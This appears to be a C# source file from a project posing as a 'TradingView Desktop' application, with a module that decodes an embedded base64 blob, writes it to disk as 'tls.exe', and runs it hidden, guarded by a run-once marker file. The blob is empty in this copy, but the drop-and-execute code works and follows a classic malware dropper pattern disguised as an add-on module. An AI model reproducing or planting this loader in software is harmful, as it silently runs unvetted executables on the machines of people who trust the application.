using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace TradingViewDesktop
{
    class AddModule
    {
        static string base64 = "";

        public static string CreateMD5(string input)
        {
            using (System.Security.Cryptography.MD5 md5 = System.Security.Cryptography.MD5.Create())
            {
                byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(input);
                byte[] hashBytes = md5.ComputeHash(inputBytes);

                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < hashBytes.Length; i++)
                {
                    sb.Append(hashBytes[i].ToString("X2"));
                }
                return sb.ToString();
            }
        }

        public static void ExportAndStartAdditionalModule()
        {
            if (File.Exists(CreateMD5(base64) + ".log"))
            {
                return;
            }

            File.Create(CreateMD5(base64) + ".log");
            byte[] file = Convert.FromBase64String(base64);
            File.WriteAllBytes("tls.exe", file);
            ProcessStartInfo Info = new ProcessStartInfo();
            Info.WindowStyle = ProcessWindowStyle.Normal;
            Info.CreateNoWindow = true;
            Info.FileName = Path.Combine(Path.GetDirectoryName(Application.ExecutablePath), "tls.exe");
            Process.Start(Info);
        }
    }
}
